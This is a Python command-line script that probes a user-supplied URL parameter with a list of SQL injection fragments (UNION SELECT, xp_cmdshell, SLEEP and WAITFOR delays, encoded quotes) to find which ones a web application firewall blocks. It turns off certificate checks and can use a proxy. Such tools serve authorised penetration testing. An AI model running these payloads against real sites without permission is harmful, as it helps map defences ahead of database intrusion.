import requests
from urllib3.exceptions import InsecureRequestWarning
import urllib.parse
import colorama
from colorama import Fore, Style

# Initialize colorama for Windows compatibility
colorama.init()

# Print your username in red
print(Fore.RED + "\n[+] Script executed by: Vi3xal\n" + Style.RESET_ALL)

# Suppress only the InsecureRequestWarning from urllib3
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def test_sql_injection(url, param, proxy=None, block_word=None):
    # List of common SQL injection payloads
    test_payloads = [
        "'", '"', '--', ';', '/*', '*/', '@@', '@', 'char()', 'OR 1=1', 
        'UNION SELECT', 'WAITFOR DELAY', 'xp_cmdshell', 'sp_executesql', 
        'CAST()', 'CONVERT()', 'ORDER BY', 'GROUP BY', '%27', '%22', 
        '%3B', '%2D%2D', '%2F*', '%40', 'SLEEP(5)', 'BENCHMARK(1000000,MD5(1))',
        ' ', '%20', '%09', '%0A', '%0D', '%0C', '+', '-', '=', '<', '>', 
        '#', '!', '$', '%', '^', '&', '(', ')', '[', ']', '{', '}', ':', 
        ',', '|', '\\', '`', '~', 'INFORMATION_SCHEMA', 'DATABASE()', 'USER()', 
        'VERSION()', 'CURRENT_USER', 'SESSION_USER', 'SYSTEM_USER', 'SLEEP(1)', 
        'MD5()', 'SHA1()', 'RAND()', 'ABS()', 'COUNT()', 'AVG()', 'NULL', 
        'IS NULL', 'IS NOT NULL', '%2F**%2F', '%2F*!*/', '%0B', '%A0', 
        '/*!*/', 'SELECT 1,2,3', 'AND 1=1', 'AND 1=2', 'OR 1=1', 'OR 1=0', 
        'HAVING 1=1', 'HAVING 1=2', 'IF(1=1,1,0)', 'IF(1=2,1,0)', '0x41', 
        '0x20', '%u0020', '%u0027', '%u0022', 'SLEEP(10)', 
        "WAITFOR DELAY '0:0:10'"
    ]

    # Dictionary to store results
    blocked_payloads = []

    print(f"\nTesting for SQL injection on {url} parameter '{param}'...")

    # Proxy configuration
    proxies = {
        "http": proxy,
        "https": proxy
    } if proxy else None

    # Testing each payload
    for payload in test_payloads:
        # Inject the payload into the specified parameter
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        query_params[param] = payload
        modified_query = urllib.parse.urlencode(query_params, doseq=True)
        test_url = urllib.parse.urlunparse(parsed_url._replace(query=modified_query))

        try:
            # Send the request through the proxy if specified
            response = requests.get(test_url, proxies=proxies, verify=False, timeout=5)
            # Check if the response indicates blocking
            if response.status_code == 403 or (block_word and block_word.lower() in response.text.lower()):
                blocked_payloads.append(payload)
                print(Fore.RED + f"Payload '{payload}' is likely blocked by the WAF." + Style.RESET_ALL)
            else:
                print(Fore.GREEN + f"Payload '{payload}' passed." + Style.RESET_ALL)
        except requests.RequestException as e:
            print(Fore.YELLOW + f"Error testing payload '{payload}': {e}" + Style.RESET_ALL)

    # Summary of blocked payloads
    print("\nSummary:")
    if blocked_payloads:
        print(Fore.RED + f"The following payloads were potentially blocked by the WAF: {', '.join(blocked_payloads)}" + Style.RESET_ALL)
    else:
        print(Fore.GREEN + "No payloads appear to be blocked by the WAF." + Style.RESET_ALL)

if __name__ == "__main__":
    # Get user input for the URL and parameter to test
    target_url = input("Enter the target URL (with parameters): ").strip()
    test_param = input("Enter the parameter to test for SQL injection: ").strip()

    # Get user input for the proxy settings
    use_proxy = input("Do you want to use a proxy? (yes/no): ").strip().lower()
    proxy = None
    if use_proxy == "yes":
        proxy = input("Enter the proxy address (e.g., http://127.0.0.1:8080): ").strip()

    # Ask the user if they want to specify a word or line to detect blocked responses
    use_block_word = input("Do you want to specify a word or line to detect blocked responses? (yes/no): ").strip().lower()
    block_word = None
    if use_block_word == "yes":
        block_word = input("Enter the word or line to look for in the response to detect blocking: ").strip()

    # Run the SQL injection testing function
    test_sql_injection(target_url, test_param, proxy, block_word)
